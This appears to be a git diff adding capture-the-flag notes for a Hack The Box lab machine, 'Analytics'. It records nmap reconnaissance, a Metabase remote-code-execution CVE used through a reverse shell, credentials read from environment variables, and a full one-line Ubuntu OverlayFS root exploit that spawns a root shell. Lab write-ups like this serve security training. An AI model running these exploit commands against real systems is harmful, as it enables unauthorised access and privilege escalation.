@@ -538,3 +538,42 @@ _laurel:x:998:998::/var/log/laurel:/bin/false`
     - http://cozyhosting.htb/login
     - F12 -> Storage -> replace cookie and refresh the page
         - 
+        
+## Analytics
+### Reco
+- nmap -sVC 10.10.11.233
+    - 22 SSH
+    - 80 HTTP -> redirect to http://analytical.htb
+        - add to /etc/hosts
+- website
+    - static one/page website with no functions
+    - login sub-page: data.analytical.htb (add to /etc/hosts)
+        - login form METABASE
+### Enumeration
+- VULN -> CVE-2023-38646-PoC
+    - https://github.com/shamo0/CVE-2023-38646-PoC
+    - https://github.com/securezeron/CVE-2023-38646
+- Neccessary parameters for attack:
+    - -u : http://data.analytical.htb
+    - -t : 249fa03d-fd94-4d5b-b94f-b4ebf3df681f
+        - from: http://data.analytical.htb/api/session/properties
+            -> setup-token
+    - -c : reverse shell
+### Exploitation
+- python CVE-2023-38646-Reverse-Shell.py --rhost data.analytical.htb
+    - we have the revesle shell -> env -> 
+        - META_USER=metalytics
+        - META_PASS=An4lytics_ds20223#
+### User flag
+- ssh metalytics@10.10.11.233
+    - PW: An4lytics_ds20223#
+- cat user.txt
+### Root flag
+- uname -a
+    - Linux analytics 6.2.0-25-generic #25~22.04.2-Ubuntu
+        - CVE -> https://github.com/OllaPapito/gameoverlay
+- unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/; setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=
+u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("bash")'
+    - cd /root
+    - cat root.txt
+        
